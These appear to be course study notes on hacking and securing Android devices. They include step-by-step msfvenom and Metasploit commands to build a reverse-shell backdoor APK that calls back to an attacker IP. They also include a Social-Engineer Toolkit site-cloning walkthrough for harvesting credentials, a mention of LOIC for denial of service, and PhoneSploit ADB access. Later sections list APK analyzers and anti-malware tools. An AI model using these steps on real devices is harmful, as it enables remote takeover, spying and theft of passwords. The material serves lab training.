# 17. Hacking Mobile Platforms

Android has a stack of software components categorized into six sections:
- System Apps, 
- Java AP Framework, 
- Native C/C++ Libraries, 
- Android Runtime, 
- Hardware Abstraction Layer (HAL) 
- Linux kernel and five layers


## Hack

### Create Binary Payloads
  1. ``` service postgresql start ```
  2. ``` msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[Attacker IP] R > Desktop/Backdoor.apk ```
  3. ``` msfconsole ```\
     ``` use exploit/multi/handler ```\
     ``` set payload android/meterpreter/reverse_tcp ```\
     ``` set LHOST 10.10.10.13 ```\
     ``` exploit -j -z ```
  4. On android, install Backdoor.apk
  5. See "Meterpreter session 1 opened"
  6. ``` sessions -i 1 ```
  7. ``` sysinfo ```
  8. ``` cd /sdcard ``` pwd, shows "/storage/emulated/0"
  9. ``` ps ``` view the processes running in the system.

### Harvest users’ credentials using the Social-Engineer Toolkit
  
   The toolkit attacks human weakness, exploiting people’s trust, fear, avarice, or helping natures.
   
   1.  ``` cd setoolkit && ./setoolkit ```
   2.  Social-Engineering Attacks
   3.  Website Attack Vectors
   4.  Credential Harvester Attack Method
   5.  Site Cloner
   6.  Make victim to visit the cloned site and enter passwords.

### DoS Attack
  Low Orbit Ion Cannon (LOIC)

  Low Orbit Ion Cannon LOIC_v1.3.apk 

### Exploit the Android Platform through ADB using PhoneSploit
  
  1. ``` cd PhoneSploit ```
  2. ``` python3 -m pip install colorama ```
  3. ``` python3 phonesploit.py ```
  4. ``` select [3] Connect a new phone ```
  5. Get shell command line of the phone.
  6. ``` [7] Screen Shot a picture on a phone ```
  7. ``` [14] List all apps on a phone ```
  8. ``` [15] Run an app ```
  9. ``` [18] Show Mac/Inet ```
  10. ``` [21] NetStat  ```

### online Android analyzers
  - NetCut (http://www.arcai.com), 
  - drozer (https://labs.f-secure.com), 
  - zANTI (https://www.zimperium.com), 
  - Network Spoofer (https://www.digitalsquid.co.uk), and 
  - DroidSheep (https://droidsheep.info)

## Secure

### Sixo Online APK Analyzer
  
  https://www.sisik.eu/apk-tool
  
  Requested Permissions section
  -  Some permissions are granted by the user when installing the app and some need to be confirmed later while the app is running.
  -  declared in the app’s AndroidManifest.xml file
  -  AndroidManifest.xml contains the app’s package name, version information, declarations of app components, requested permissions...

### other tools
- SandDroid (http://sanddroid.xjtu.edu.cn)
- Apktool (http://www.javadecompilers.com)
- Apprisk Scanner (https://apprisk.newskysecurity.com)

### Analyze a Malicious App using Quixxi Vulnerability Scanner

  https://vulnerabilitytest.quixxi.com/#/
  
  Get a Vulnerability Scan Report:
  - Permissions Used
  - CERTIFICATION INFORMATION
  - Issue, Severity, Assessment Status, CWE, Exploits
  
  Android vulnerability scanners:
  - X-Ray (https://duo.com)
  - Vulners Scanner (https://play.google.com)
  - Shellshock Vulnerability Scan (https://play.google.com)
  - Yaazhini (https://www.vegabird.com)
  - Quick Android Review Kit (QARK) (https://github.com) 
  
## Secure Android Devices from Malicious Apps using Malwarebytes Security

  **Malwarebytes** app
  
  ### other mobile antivirus and anti-spyware tools:
  - AntiSpy Mobile (https://antispymobile.com)
  - Spyware Detector - Anti Spy Privacy Scanner (https://play.google.com)
  - iAmNotified - Anti Spy System (https://iamnotified.com)
  - Privacy Scanner (AntiSpy) Free (https://play.google.com)
